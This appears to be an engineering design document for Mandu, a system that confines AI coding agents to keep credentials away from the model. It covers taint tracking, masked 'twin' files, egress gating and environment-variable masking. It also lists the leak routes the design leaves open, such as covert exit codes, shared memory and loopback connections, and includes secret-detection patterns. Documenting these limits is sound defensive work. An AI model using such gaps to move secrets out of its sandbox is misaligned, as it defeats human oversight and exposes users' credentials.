| b0 | `bash` `. ./.env && ./deploy.sh`, no reader list | structured twin | nobody tainted; `$STRIPE_KEY` is a symbol | the real output, raw | released at `api.stripe.com` if the proxy can see the body; a symbol in a TLS tunnel is blocked with a reason |
| b | same, with a reader of `.env` feeding the shell (a shell named alone admits nothing, §2.3) | `.env` | bash, deploy.sh, curl tainted S1 | `$MDU:nomodel_Exec[3f1a]` (rule i); human sees "deployed v1.4" | `api.stripe.com` allowed; `httpbin.org` asks |
| c | `psql -c 'select count(*) from users'` | `~/.pgpass` | psql tainted S2 | `count 1204` (rule ii, value-scanned) | `db.internal:5432` only |
| d | `git commit -a`, `.env` tracked | not a reader | `EACCES` on `.env` | git's own error text, plus the `[mandu:secret]` note | n/a |
| e | `aws s3 ls` | `~/.aws/credentials` | aws tainted S3 | bucket names raw; any `AKIA…` span a symbol (rule iii) | `*.amazonaws.com` only |
| f | `npm start` (dotenv) | `.env` via `node` running a pinned script (§2.3) | the server tainted S1 for its lifetime | `$MDU:nomodel_Exec[…]` (rule i, for every read of its log) | bound hosts only |

Row (b) is the honest cost: the model cannot read a deploy log produced by a
shell that holds the key. It can tell the user the deploy ran and that the
output is masked, and the user reads it in full. Row (f) is the same cost
for a dev server, for as long as it lives. Both are where a user reaches
for rule (ii) on a leaf binary (`aws`, `stripe`, `vercel`) instead of a
shell.

The S1–S6 battery of `protection-modes.md` §8.5 with no reader configured:
S1 (list variable names) and S4 (profile names in `cloud/credentials`)
complete with raw output, because the structure survives; S3 (deploy)
completes when the proxy can rewrite the request, and otherwise fails with
a reason naming the tunnel; S5 (git) commits the twin. (Corrected
2026-10-10: no note follows a commit. The `twin:` note fires only when a
tool's output is itself twin text, §11.8, and `git commit` prints none. A
`git commit -a` that sweeps a tracked twin along records the placeholder
in the user's repository; the launcher now says so after the session,
confidentiality.md §7.2a "A placeholder in your repository".) Canaries hold
by construction in every configuration: no raw byte reaches the model on
any row.

## 6. What this does and does not close

Closed, by construction, for a process the interposer mediates:

- the model-context exit (symbolized per §4.2);
- the INET and AF_UNIX network exits to unbound destinations (§4.3): a
  `connect()` after the taint, every send that names an address (a DNS
  query, any datagram, a Unix datagram to a path), the INET sockets the
  process and its descendants already hold when it becomes tainted, an
  inbound connection a holder accepts, a socket it receives over
  `SCM_RIGHTS`, a Unix socket connected to a named peer before the taint,
  and an orphan forked after the taint (no process in the tree can make a
  `CLONE_PARENT` sibling: the filter refuses it, and `clone3`). The taint
  is the process's, not a thread's, and a descendant judged once keeps it
  after its parent exits (`exec-routing.md` §7.5). HTTPS through the
  session proxy is judged against the taint per request (Plan 13 D6);
- files written by a tainted process (derived label at the process level),
  including a file it or a descendant already held open for writing when
  it read the secret (`reader > out.txt`, Plan 13 D5);
- children (lineage), `/proc` introspection and `ptrace` of a tainted pid;
- pipes, FIFOs and unnamed socket pairs at the network and write exits
  (Plan 13 D2, §4.5.1): a process reading what a holder writes into one is
  a holder, so in `reader | curl …` curl is refused at an unbound host and
  in `reader | tee copy.txt` copy.txt is labeled. The agent itself is never
  made a holder this way (its channel is the model exit).

Accepted, and stated in the claim:

- **Covert channels of a tainted process**: exit code, timing, file *names*
  and sizes it creates, the fact that it connected to a bound host. A shell
  can encode a key in exit codes; nothing at this layer stops it. This is
  the one place where the flow design is weaker than the twin, and it is
  bounded by the reader list: only the programs the user named ever hold
  the bytes.
- **IPC between a tainted process and an untainted one**: System V / POSIX
  shared memory, signals, files in `/dev/shm` (a write-intent open, so
  labeled), X11/Wayland clipboards, and a connection the holder ACCEPTS
  from this machine (the accept gate admits a loopback or Unix peer, so a
  local untainted client may receive what the holder writes back; Plan 13
  R1). Also open: a socket pair joined after the taint, and a pipe between
  two processes outside the guard's tree.
- **The declassifier is a trust statement.** Rule (ii)/(iii) on an app that
  can be argued into printing its credential (`psql`'s `\!` runs a
  *separate* process, which is denied; an app with a `--debug` that dumps
  its config is the user's mistake). The value scan bounds the damage to
  non-verbatim encodings.
- **macOS** stays deny-only (Seatbelt cannot interpose an open); the reader
  list has no enactment there.

Not accepted, and the reason the spikes ran first:

- an interposer cost that makes a `grep -r` over a large tree or a Node
  agent's startup noticeably slower (§7.1);
- a session that drifts to mostly-masked tool results under realistic use
  (§7.2). If the fold of §3.2 masks too much in practice, the per-fd
  tracking it ruled out becomes the next design.

## 7. Spikes before building

### 7.1 Trap cost

Every open in the agent tree traps to the supervisor. The rule set before
the build: under 10 % on build and test workloads and under 300 ms on agent
startup, or move the path check into the kernel (a BPF-LSM, which needs
root and is out). **Measured** with an env-gated spike mode of
`mandu-net-guard` (`MANDU_NET_GUARD_TRAP_OPEN=1`: trap the open family and
answer `CONTINUE`), a test host, kernel 6.8, release build, best of 3:

| workload | bare | guard, connect only | guard + open trap | opens trapped |
|---|---|---|---|---|
| `rg -c` over the repo | 0.017 s | 0.021 s | 0.027 s | 1 372 |
| `node -e 'require("typescript")'` | 0.281 s | 0.322 s | 0.290 s | 20 |
| `tsx --test` three arbiter unit files | 2.28 s | 2.29 s | 2.46 s (+8 %) | 2 599 |
| `find ~ -maxdepth 4 -name '*.json'` | 0.34 s | 1.17 s | 1.80 s | 16 327 |
| `cat` 20 000 one-line files | 0.53 s | 0.56 s | 1.06 s (2×) | 20 007 |

About **25 µs per trapped open**: the rule is met, and only an
open-per-file workload doubles. Verdict: no kernel-side path filter. The
spike mode stays in the binary, off by default. Re-measured for §4.1a with
a secret policy, the performed guard costs +2 % on the test row (0.932 s
against 0.910 s bare), 0.044 s against 0.021 s for `rg`, and 2.4× bare on
the `find` and `cat` walks, all well under the `CONTINUE` guard it replaced
(which created a thread per open and re-`stat`ed the registered files on
every directory open).

### 7.2 Drift

Rule: fewer than one in five tool results masked in a long coding session.
**Measured** offline over recorded sessions (`scripts/spikes/plan10-drift.ts`;
any command naming a catalog secret path counts, an over-count): **13 of
939 Bash+Read results (1 %)** would be masked under rule (i) if every
catalog consumer were a listed reader; the 813-result coding session, 0.
The worst scenario, S3, 3 of 9, all the model's own Reads of `.env`, which
reach it as the structured twin. So the consumer table (§11.3) ships as
rule (i) with no `mask` list.

## 8. Phasing and tests

Each phase shipped with unit and e2e tests, in the fail-closed order (a
store and a gate before any raw byte is handed out). All are built.

0. **The baseline (no interposer, no taint).** The shape extractors
   (`secret-extract.ts`), one field symbol per value
   (`$MDU:nomodel_Read[h].KEY`), the structured twin the launcher writes,
   the environment mask (§11.4), the arbiter's **structured read-twin
   rule** (`isStructuredTwinReadRendering`: a Read of the twin is
   forwarded raw and public; a hallucinated `.field` never resolves to the
   file's bytes), `paths[].extract`, and the wire release (§11.5). Oracle:
   `tests/stack/protection-modes.test.ts` (real arbiter and proxy: the twin
   reaches the model with no canary, the value stays a secret symbol, the
   env op masks); every catalog shape round-trips through its own parser.
1. **Policy and stores (privilege-free).** `arbiter/policy/flow-taint.ts`
   (`decideOpen`, `matchReader`, `CONSUMER_TABLE`, `outputRuleFor`,
   `foldRules`); `paths[].readers`/`others` in `load-policy.ts`, validated
   in `policy-file-validate.ts`; the provenance store's
   `process_secret_taint` and `call_roots` tables; the IPC ops. Tests:
   `flow-taint`, `provenance-store`, `provenance-ipc`,
   `policy-file-validate`, `compiled-policy`.
2. **The interposer, with readers learned on approval.**
   `net-supervisor/src/secret_open.rs` (the policy file
   `MANDU_NET_GUARD_SECRETS` the launcher writes: real path, twin path,
   level, the agent's executable, the ask mode) and `handle_open_notif`
   (§4.1, §4.1a); the **Inbox hold** (§11.1; the guard keeps the open
   suspended and re-asks every half second until the verdict changes or
   the §12.2 ceiling passes); the **pin write-back** through the arbiter,
   the law's single writer; the `/proc` and `ptrace` clauses; AF_UNIX
   bindings. Live: `launcher/test/secret-readers-live.test.sh` (a real
   arbiter with `readers:`, the real guard, real bwrap: raw / EACCES / twin
   by descriptor with and without the bind, the unix leg, introspection, a
   held `cat` completing after the allow and leaving its pin).
3. **The two exits.** *Model context:* the guard traps `execve` (argv read
   while the tracee is suspended; `recordExecRoot`: lineage edge, signature,
   call root, §4.2); refused opens are recorded (`secret_open_denials`);
   both model proxies (`secretTaintFor`) ask `callTaint` for every
   exec-shaped result and apply §4.2 and the note (§11.8); a throwing
   `callTaint` masks. *Network and filesystem:* the guard keeps the set of
   processes it handed raw bytes to (`TaintedSet`) and records the taint
   BEFORE the `ADDFD` that resumes the reader (`taint_then`; the other
   order lets its next syscall reach another worker untainted); a tainted
   `connect()` is judged by `taintedProcessBindings` (§4.3); the net-proxy
   applies the same rule on every proxied leg to the processes its `/proc`
   attribution finds holding the client's socket (`hostIsBound`; plain
   HTTP per request, each TLS-inspected request, a blind CONNECT judged
   before each chunk; an unattributable connection is refused while the
   session holds a secret, Plan 13 D6); a write-intent open by a tainted
   process mints a derived label BEFORE the writer gets its descriptor
   (`labelWrittenPathTainted`), so `cp .env c; cat c` cannot read the copy
   raw, with the writer identified before the open is answered and the
   guard draining in-flight handlers (at most 5 s) before it exits. E2E per
   exit, each asserting the invariant by name: under (i) no byte of the
   secret reaches the model; under (ii) the verbatim value never does; a
   non-reader's open fails; an unbound connect is withheld with
   `egress:tainted-process-unbound`; a child inherits; a rule-(i) result
   does not raise the watermark (`protection-modes.test.ts`,
   `invariant-oracle.test.ts`, `secret-readers-live.test.sh` §7–§8, each
   production adapter in `proxy-real-client-parity.test.ts`).
4. **Live.** The S1–S6 battery through the launcher with the guard around a
   real Claude Code: 6 of 6 tasks and 6 of 6 canaries, 0 approvals, 0
   refused launches; the repeat on two models held 36 of 36 canaries
   (`protection-modes.md` §8.5). The conf-only `claude-e2e.test.ts` group
   has no reader scenarios: that harness does not launch through `mandu`,
   so the guard is never around it.
5. **Surface (read-only).** The Inbox sentence for a held open ("The
   program `/usr/bin/psql` wants to read a protected file as itself:
   `~/.pgpass`. If you allow it, the program gets the real contents and
   whatever it shows the AI stays masked."); the Secrets panel's masked
   value counts, raw readers and "Programs holding a secret" (§11.9); the
   Your-rules page; the `[mandu:secret]` note on the tool card (the proxy
   emits `secretTaint` and `secretNote`, never content). Not built, by
   choice: a switch that WRITES reader rules from the dashboard, and
   `mandu secrets reader add`.
6. **Retire the bind.** The guard serves every registered secret by
   descriptor, so a host with **no user namespace** (Ubuntu 24.04 before
   `mandu setup`) launches **confined** when the guard is around the launch
   (`guardServesTwins`, "confined (by the guard, no bind)"); `gated`
   remains only without the guard binary. The npm bundle ships the guard
   (`packaging.md` §5); the fresh-install suite proves a stock Ubuntu 24.04
   confined from its first launch (`rootless-confinement-ubuntu-2404.md`
   §11). `--no-secret-bind` / `MANDU_SECRET_BIND=0` runs the guard-only
   posture where a bind could mount. **The default stays "bind where
   possible"**: the bind is a second, VFS-level implementation of the twin
   (a guard that dies fails closed on its own,
   `rootless-confinement-ubuntu-2404.md` §12.2), and it keeps Claude Code's
   permission dialog on the workspace path (`confidentiality.md` §7.2). It
   is left off where it would stop the agent's own sandboxes (Ubuntu
   26.04's bwrap profile bars nested sandboxes: `bindGap:
   "bwrap-nesting"`, §12 there).

## 9. Relation to the rest

- `confidentiality.md` §7.1 (the valve) and §8 (derived data): this plan is
  their process-level realization; §7.1's "net XOR secret" becomes "net
  only to the bindings" for a tainted process. §7.2 (twins) stays the
  mechanism for the agent's own reads where the bind mounts.
- The secret registry is unchanged as the registry; its Linux twin is
  structured (§2.4) and stays the view of every program that is not a
  listed reader.
- The session watermark (`confidentiality.md` §4) and the derived-label
  store (§8 there) are reused; process taint is a new level source writing
  to the same `derived_labels` table.
- `fs-provenance.md`: the provenance registry and proc-key attribution are
  the taint substrate; the level is the added column.
- `protection-modes.md` §8.6: findings 1 and 2 are closed by this plan.
- `symbol-twin-shell-blindness.md`: the `[mandu:twin]` note became the
  `[mandu:secret]` note.
- `rootless-confinement-ubuntu-2404.md` §10: this is the design doc that
  proposal asked for.

## 10. Related work

`confidentiality.md` §13 places the lattice against CaMeL, FIDES and PFI.
This section places the *flow* mechanism against the sandboxes, masking
tools and OS information-flow systems. Three families exist, distinguished
by the unit they act on; this plan is a fourth.

**Sandboxes decide access per box.** Claude Code's sandboxed Bash tool
(bubblewrap / Seatbelt, a domain-allowlist proxy, `denyRead`), Codex CLI
(Seatbelt; bubblewrap + Landlock + seccomp), Gemini CLI, Anthropic's
`sandbox-runtime`, and Sandlock (arXiv 2605.26298). The unit is a command or
a container: a secret file is readable by everything inside or by nothing,
and nothing is tracked after the read. Sandlock is the nearest in mechanism
(the same unprivileged stack: Landlock, seccomp, user-notification,
`pidfd_getfd`) and says so itself: it "bounds stage capabilities, not pipe
content".

**Masking scrubs strings after the fact.** 1Password `op run`, GitHub
`::add-mask::`, GitLab masked variables, Cursor's runtime secrets
(`[REDACTED]` in the transcript), gitleaks and trufflehog. The program
holds the secret; known strings are removed from logs. It is detection: an
encoding or a substring walks through. This plan's verbatim-value backstop
(§2.2) *is* this technique, used as the last line and never the guarantee.

**Placeholder-and-inject removes the bytes and restores them at the wire.**
Claude Code's `sandbox.credentials` `mask` mode, Infisical Agent Vault,
nono, Aegis, and Mandu's whole-file twin. Nobody inside holds the bytes; a
proxy substitutes the real value into requests to bound hosts. Claude
Code's is the most complete shipped form and is, feature for feature, the
structured twin of §2.4: an `extract` regex keeps the file's structure,
`injectHosts` is `bindings`, `maskDuplicates` is the fingerprint scan, plus
SigV4 re-signing. Its limits are the family's: it covers sandboxed Bash
only, it needs TLS termination (`tlsTerminate`), and the proxy must
understand each authentication protocol. Anything that is not an HTTP
header or body (`psql` on the Postgres wire, `ssh -i`, `gpg`, a local
tool) cannot work. That is where this plan's reader list starts.

**nono** (nolabs, Apache-2.0, Rust) is the placeholder family for an
*arbitrary* agent: Landlock or Seatbelt deny the sensitive paths to
everything in the box (the model's own `Read` included), a reverse proxy
swaps a phantom token for a keystore-held key, and a policy-controlled tool
(`git`, `ssh`) runs in a child box that may receive a raw credential. That
child box is this plan's reader list without the taint: nothing records
what it emits, and the model boundary is not a chokepoint (command output
is never inspected). Figures 4d and 4e draw it beside this plan; what
Mandu took from nono is
[`comparisons.md`](./comparisons.md) §3.

**This plan: decentralized information-flow control at process level,
unprivileged, with the model as a labeled principal.** The label model is
Flume's (Krohn et al., SOSP 2007): processes carry labels, endpoints
propagate them, release is controlled. Three differences from Flume,
HiStar, Asbestos and CamFlow: declassification is a per-reader rule a human
writes about a program's output format rather than a capability the process
holds; enforcement is seccomp user-notification, not an LSM or a new
kernel; and one sink is a model whose view is a symbol while the human's
view stays raw. The nearest industry precedent for the reader list alone is
Microsoft Purview's "restricted apps may not open a file with this
sensitivity label", root-enforced and tainting nothing. In the agent
literature, FIDES (2505.23643) and CaMeL (2503.18813) declassify labeled
values per tool inside a purpose-built runtime; the per-reader `output:`
rule applies that idea to OS processes the runtime never sees.

| | unit | tracks after read | knows the program | declassify per app | raw bytes to a program | root / container |
|---|---|---|---|---|---|---|
| Claude Code sandbox `deny` | command box | no | no | no | no | no |
| Claude Code `mask` + `injectHosts` | command box + proxy | no | no | at the proxy, per protocol | no | no (TLS termination) |
| Sandlock, Codex, Gemini | command / container | no | argv as a signal | no | all or nothing | no |
| `op run`, `add-mask`, Cursor | string | no | no | no | everyone | no |
| nono | session box + child box per tool + proxy | no | resolved command policy, lineage-aware (`from.git`) | at the proxy, per protocol | a named child tool; everyone via `env_credentials` | no (Landlock / Seatbelt) |
| Flume / HiStar / CamFlow | process + endpoint | yes | by capability | capability holder | yes, labeled | new kernel / LSM |
| Purview restricted apps | file label + app | no | yes | admin policy | allowed apps | endpoint agent |
| CaMeL / FIDES | interpreter value | in-framework | tool, not process | per tool | not modeled | n/a |
| **Plan 10** | process, per file | yes | resolved executable | per reader rule + value scan | listed readers only | no |

**Measured (2026-10-19,** [`comparisons.md`](./comparisons.md) §5**).**
Fifteen everyday tasks, Claude Code with Claude Sonnet 5.5, 3 takes each
(45 sessions per setting), each per-file baseline set up for the task's own
secret files and every baseline graded by a neutral recorder: Mandu
`secrets` mode kept the secret and did the task in 43 of 44 sessions with a
rule for each task and in 41 of 45 as a fresh install; Claude Code's
per-value `mask` in 27 of 45 (its leaks through the model's own `Read` and
a command's output, outside its Bash-only scope), PrivAiTe in 25 of 44,
its deny rules in 14 of 45 (they keep the file by blocking the task),
fencepost in 10 of 44, OpenShell as its docs direct in 8 of 45, nono in 4
of 45, OpenShell with the whole project inside in 3 of 45, no protection in
2 of 44. Over only the tasks both can win by design, Mandu (a rule for
each task) did both in 40 of 41 sessions and the mask in 27 of 42. The
tasks are ours, Mandu was improved on earlier runs of them, and the caveats
are in comparisons.md §5.4; the 2026-10-17 battery (six tasks, 17 of 18)
is superseded.

**What is new here.** One named program holding the bytes, with its
stdout, writes, children and `connect()` targets labeled, is the empty cell
in the table, and it makes non-HTTP consumers work without per-protocol
proxy code; because the reader holds the bytes, the network gate needs to
know where a tainted process connects, not what its request looks like (no
TLS termination, no re-signing, AF_UNIX destinations bindable). The LLM's
process is a principal with the same two questions as `psql` (may it read
raw? what does its output become?), answered "never" and "symbol".

**Not claimed.** "No program ever holds the bytes" is a property the
placeholder family has and this plan gives up for listed readers (§6,
covert channels); the baseline of §2.4 keeps that property for every file
without a reader list, so the two compose. The declassifier is trust in a
program; FIDES derives labels from typed signatures and cannot mislabel
inside its world. DIFC and taint are textbook (Flume, HiStar, TaintDroid,
CamFlow); the claim is the locus and the principal set.

Sources: code.claude.com/docs/en/sandboxing and /sandbox-environments;
github.com/anthropic-experimental/sandbox-runtime; arXiv 2605.26298
(Sandlock), 2503.18813 (CaMeL), 2505.23643 (FIDES), 2504.11703 (Progent),
2607.05743 (execution-security survey), 2604.03070 (credential leakage in
agent skills); Krohn et al. 2007 (Flume); camflow.org; docs.kernel.org
Landlock; 1password.dev/cli/secret-references;
github.com/Infisical/agent-vault; nono.sh/docs (networking,
credential-injection, tool-sandbox, environment, security-model, the Claude
client; read 2026-09-25); cursor.com/docs/cloud-agent/security-network.

## 11. Product decisions

The decisions that make the design one an end user never has to configure,
and the rules added as the build met real agents. Each names where it lands
above; where it changes an earlier rule, the earlier rule is amended here.

### 11.1 Reader lists are learned, not written

Configuration is where every comparable system loses its users (Claude
Code's mask needs a JSON entry per file with an `extract` regex and
`injectHosts`; Purview's per-app rules are admin-authored; Flume-style DIFC
failed in practice on labels nobody wanted to write). Mandu already has the
surface that solves this: the approval Inbox with allow / allow-once / deny
and a remembered verdict.

- A program in the consumer table (§11.3) is a DEFAULT reader of its file
  when the file has no reader list: raw, pinned on first use, from a binary
  out of the agent's reach (§2.3; a per-user install asks once). So `psql`
  worked on day one with no prompt at all. *Revised by Plan 13 D8 (12)
  (2026-10-04):* a default reader reads raw only when vetted (`ssh`,
  `ssh-add`); `psql` and `pg_restore` are printers and get the twin, which
  does not log in (Postgres has no wire release), so a `~/.pgpass` login
  fails under Mandu. `PGPASSWORD` in the launch environment was the way
  out until 2026-10-09, when §11.4's name list caught up with its design
  (`*PASSWORD*`) and masked it: the ways out are now peer authentication,
  a non-printing program of the user's as the file's reader (`prints:
  nothing`, the database in the file's bindings), or the law's
  `env.exempt: [PGPASSWORD]` (the model can then read it); §11.4.
- A program that is NOT a default reader is held and raises an Inbox row
  under `secrets-ask = always` (any program) or `known` (the default: a
  known consumer of a file whose list exists but omits it). An unknown
  program never generates a question; it gets the twin, or the denial of a
  listed file.
- The hold is a pending row (`open:<exe>#<sha256>` → path), resolved with
  the same allow / once / deny as any withheld symbol. It is keyed by the
  binary (Plan 13 D8): the row and its verdict name the opener's resolved
  executable and its hash (`openVerdictSubject`), so an answer about
  `/usr/bin/psql` admits no other binary called `psql` and spends no `once`
  on one. Without a hash (an executable the guard cannot read) the path
  alone. Reader names, the Inbox sentence and `mandu why` show the path,
  never the hash.
- A standing allow becomes the reader entry, written to `policy.yaml` by
  the arbiter as every other human verdict is; the YAML stays the audit
  record and the expert path.

### 11.2 App identity is a pin, not a directory list

A reader entry records the **resolved executable path and its hash**,
taken from the real file at approval or first use (§2.3). The interposer
matches a process by `/proc/<pid>/exe` and the hash of that inode, cached
per inode. A rebuilt `/usr/bin/psql` re-prompts once. No agent-writable
directory can satisfy a pin, because the pin is never taken from the
agent's world. Scripts are their interpreter, and interpreters are rule (i)
only, unless the entry names the script too (§2.3): then the pin is the
pair, and the script's hash is taken at first use only from a file out of
the agent's reach.

**Lineage-conditional readers and the ssh-agent** (`comparisons.md`
§3.5). A reader entry may carry `from: <app>`: it counts only when a
process of that app is among the opener's ancestors (`readers: [{app: ssh,
from: git}]` lets git's ssh read the key and refuses an ssh the agent runs
directly). The guard walks `/proc` for the opener's ancestor executables
inside the session (`reader_identity::ancestors`, 16 levels, stopped below
the guard: what launched Mandu is no parent, and a chain that does not
reach the guard gives none; plan 13 §3 D8, 2026-10-17) and sends them as
`ancestorExes` with `ancestorTrusted` (§2.3); only a trusted ancestor of
the name counts, and unknown ancestry never matches (fails toward the
twin). A first-use pin keeps `from:`, so pinning never widens the rule.
Names match exactly or through a version or alternatives suffix (`python3`
names `python3.12`, `nc` names `nc.openbsd`, never `ssh2`;
`appNameMatches` / `app_name_matches`). `ssh_agent: { readers }` makes
`$SSH_AUTH_SOCK` a secret socket: the launcher names it in the guard's
policy file (`sockets:`), and the guard's AF_UNIX branch lets only a
matching reader connect (`EACCES` and a `secret-socket-reader` event
otherwise), decided in the guard (`socket_reader_match`) with no arbiter
round trip. Without the section, or without the guard's secret policy, the
agent socket is ungated. Tests: `flow-taint`, `policy-file-validate`,
`policy-delta`, `provenance-ipc` unit; launcher `secret-setup` unit; Rust
`secret_open` unit; `secret-readers-live.test.sh` under the real guard.

### 11.3 A built-in consumer table ships with the catalog

The catalog knows the secret shapes and their canonical consumers:
`~/.pgpass`/`psql`, `~/.aws/credentials`/`aws`, `~/.config/gh/hosts.yml`/`gh`,
`~/.npmrc`/`npm` (and `yarn`, `pnpm`, `node`), `~/.docker/config.json`/`docker`,
`~/.kube/config`/`kubectl`, `~/.ssh/id_*`/`ssh` and `git`, `~/.netrc`/`curl` and
`git` (its opener there is `git-remote-http(s)`, on the row since 2026-10-04,
and for a dumb-HTTP remote `git-http-fetch` / `git-http-push`, since 2026-10-07),
`~/.pypirc`/`twine`, `~/.cargo/credentials.toml`/`cargo`,
`~/.git-credentials` and `~/.config/git/credentials`/`git` (its `store`
helper, §11.13). Every entry is rule (i) and pinned at first use from a
binary out of the agent's reach (§2.3), except the consumers that print
files (Plan 13 §3 D8: `curl` and `scp` since 2026-10-03, `git` and
`git-credential-store` since 2026-10-04, Plan 13 §4.9), which never read
raw and get the twin the wire release serves (`.netrc`,
`.git-credentials`) or what any program gets (the ssh keys, which `ssh`
opens). The `.npmrc` consumers read the
twin instead, listed or not, when every token in the home `.npmrc` is one
the session's inspecting proxy puts back at the registry its key names
(§11.13.1). A user who never opens the dashboard gets `ssh` working on day
one, with its output masked. No rule (ii)/(iii) entry ships: the drift
spike (§7.2) found no need.

> **Revised by Plan 13 D8 (12) (2026-10-04).** Only the vetted consumers
> (`ssh`, `ssh-add`) read their file raw by default; the others read the
> twin, which logs in where the wire release serves it. `psql` and
> `pg_restore` are printers and read nothing raw, so a `~/.pgpass` login
> fails under Mandu. This paragraph first named `psql` as the day-one
> example.

### 11.4 Environment variables are secrets too

`GH_TOKEN`, `ANTHROPIC_API_KEY`, `AWS_SECRET_ACCESS_KEY` exported in the
user's shell reach every process the agent spawns. At launch the launcher
sends its environment to the arbiter, which matches each variable's name
against a shape list, checks its value, registers each secret (origin
`env:NAME`, symbol `$MDU:nomodel_Env[hash].NAME`), and the launcher
**replaces the value in the agent's environment with its symbol**. The
egress gate releases it at bound hosts exactly like a file value; the reply
filter shows the human the real one. `policy.yaml` `env: { secrets: [NAME |
PREFIX_*], exempt: [...] }` adds or exempts names (§12.1).

What is a secret (`secret-extract.ts` `envSecretSpan`), after the
exemptions below:

1. **A URL with a password** at the start of the value masks the password
   only (`postgres://u:$MDU:….password@db/app`; pip's index variables
   percent-encode it and bind it to the index host, §11.13.1), unless a key
   in a known format (item 4) sits elsewhere in the URL, which masks the
   whole value. A URL with a password anywhere else masks the whole value.
2. **The law's `env.secrets`** names (and `env.sources`, `models[].token_env`)
   mask the whole value.
3. **The name shapes** (`ENV_SECRET_NAME_RE`) mask the whole value:
   `*_TOKEN`, `TOKEN`, `*_SECRET*`, `*PASSWORD` (so libpq's `PGPASSWORD`),
   `*_PASSWD`, `*_PASS`, `*_PWD` (`MYSQL_PWD`, not the shell's `PWD` /
   `OLDPWD`), `*_PAT` (`GITHUB_PAT`, `AZURE_DEVOPS_EXT_PAT`), `TF_TOKEN_*`
   (Terraform's per-host tokens), `*_API_KEY`, `*_APIKEY`,
   `*_ACCESS_KEY[_ID]`, `*_PRIVATE_KEY`, `*_CLIENT_SECRET`, `*_AUTH`,
   `*_CREDENTIAL[S]`, `*_SESSION_TOKEN`, `*_SIGNING_KEY`,
   `*_WEBHOOK_SECRET`, `*_WEBHOOK_URL`, `*_WEBHOOK` (`SLACK_WEBHOOK`,
   `DISCORD_WEBHOOK`, the names CI actions read; 2026-10-10). A URL value
   with no password stays raw under a shape name, except a webhook
   (`*_WEBHOOK_URL`, `*_WEBHOOK`), which is masked whole, URL password or
   not (item 1 does not apply to it): a Slack or Discord webhook's path is
   its credential. A `*_PWD` holding a directory stays raw (2026-10-10,
   `envPwdDirectory`): scripts save one under such a name (`HOST_PWD`, a
   docker-compose idiom; `ORIG_PWD`, `CALLER_PWD`), and a program that
   `cd`s to a placeholder breaks. That holds when the name says secret
   only by its `_PWD` (`DB_SECRET_PWD` stays masked), is not `MYSQL_PWD` or
   `SNOWSQL_PWD` (passwords whatever they hold), and the value is an
   absolute path of the usual path characters (`/x9F!k` is no directory).
   The trade-off: a password that looks like a directory, under a generic
   `*_PWD` name, reaches the agent raw. Not shapes: `*_DSN` (a DSN with a
   password is a URL with one, item 1, and a Sentry DSN is meant to be
   public), a bare `*_KEY`, `PGPASSFILE` / `*_PASSWORD_FILE` (paths).
4. **A key in a known format in the value**, whatever the name
   (`envValueCredentials`, 2026-10-09), masks the whole value: the content
   detector's vendor formats (`secret-detectors.ts`: GitHub, GitLab,
   Anthropic, OpenAI, Slack, Stripe live, Google API, npm, PyPI, Hugging
   Face, a PEM or OpenSSH private-key block, `aws_secret_access_key=`), held
   to a higher bar than a scan's because a hit replaces what a program
   reads: a classic `gh?_` token only with GitHub's checksum, an OpenAI key
   only by `sk-proj-` / `sk-svcacct-` / `sk-admin-` or its `T3BlbkFJ`
   marker (a bare `sk-` starts host names), an AWS access key id only with
   a 40-character secret key beside it. Never the credential-assignment
   rule: its entropy test would take hashes, build ids and random paths.
   Two gaps of the scan's detector are closed for env values (2026-10-10,
   review follow-up). A private key counts in the forms an environment
   holds one besides real lines (`envPrivateKeyBlocks`): a JSON string's
   `\n` escapes (a Google Cloud service-account key in `GCP_SA_KEY`, `\/`
   escapes too) and a PEM flattened onto one line with spaces; the
   detector's key-block rule wants a real line break after the header. And
   a line over the detector's 10,000-character limit (`MAX_LINE`, meant for
   minified bundles in a scan) is scanned in overlapping 10,000-character
   windows (`locateEnvShapes`), where it used to be skipped, so a key in a
   long one-line value (a JSON config blob) reached the agent raw: the
   fail-open direction. A hit touching a window's cut edge is dropped (the
   cut can fake the boundary a format checks); the 1,024-character overlap
   puts every vendor key whole in a neighbouring window.
   `secret-detectors.ts` and its scan-cache fingerprint are unchanged.

The design said `*PASSWORD*` plus the consumer table's known names from the
start; the code had `_PASSWORD$` and `^PASSWORD$` only, so `PGPASSWORD`,
`MYSQL_PWD`, `GITHUB_PAT`, `TF_TOKEN_*` and webhook URLs reached the agent
raw until 2026-10-09 (`docs/usage.md` even recommended `PGPASSWORD` for
Postgres, §11.1). A masked database password logs nothing in: no database
protocol has a wire release. The ways out (`docs/usage.md`, for Postgres
and MySQL alike) are a socket login that needs no password (Postgres's
`peer`, MySQL's `auth_socket`, MariaDB's `unix_socket`, with the socket's
folder under `unix_sockets.allow`), a program of the user's that is no SQL
shell named as the password file's reader with `prints: nothing` and the
database in that file's bindings (a printer such as `psql` or `mysql` can
never be one, plan 13 D8), or the law's `env.exempt`, stated in the user
docs as letting the model read the password.
`mandu doctor --secrets` lists names only (no value crosses the socket), so
it cannot show items 1 and 4, and says so. Tests: `secret-extract.test.ts`
(each name, the variables that stay raw, the formats, the exemptions),
`tests/stack/env-secret-names-launch.test.ts` (a real `--target shell`
launch).

**Exemptions, exactly** (`secret-extract.ts` `envSecretExempt`): the
agent's login credentials by name (`ANTHROPIC_API_KEY`,
`ANTHROPIC_AUTH_TOKEN`, `ANTHROPIC_CUSTOM_HEADERS`,
`CLAUDE_CODE_OAUTH_TOKEN`, `OPENAI_API_KEY`, `CODEX_API_KEY`;
`ANTHROPIC_CUSTOM_HEADERS` among them can carry an `Authorization` or
`x-api-key` header, a gateway's key, which the model can then read; under
`mandu claude` and a shell launch the launcher replaces it with its own
session header; since 2026-10-11 `ANTHROPIC_API_KEY` under `mandu
claude` is masked anyway when the launch holds an auth grant for it, and
the model proxy puts the key back in `x-api-key`,
[`agent-sign-in.md`](../agents/agent-sign-in.md) §3.8, as are Goose's
routed providers' keys (§3.10) and `OPENAI_API_KEY` / `CODEX_API_KEY`
under `mandu codex` (§3.11)), Mandu's
routing (`MANDU_*`, `ARBITER_SOCK`, `EVENT_DIR`; `MANDU_ULLM_API_KEY`, the
AI helper's key, is not masked but kept out of the agent's environment
altogether, §3.11), and the agents' config
switches (`CLAUDE_*`, `CODEX_*`) **unless** the name ends in a credential
suffix (`_TOKEN`, `_SECRET`, `PASSWORD`, `_PWD`, `_PAT`, `_KEY`,
`_WEBHOOK`, `_WEBHOOK_URL`, …). So
`CLAUDE_CODE_MESSAGING_TOKEN` (the credential a Claude Code session gives
its children for its local messaging socket; whoever holds it can message
that outer session) is masked, while a switch such as
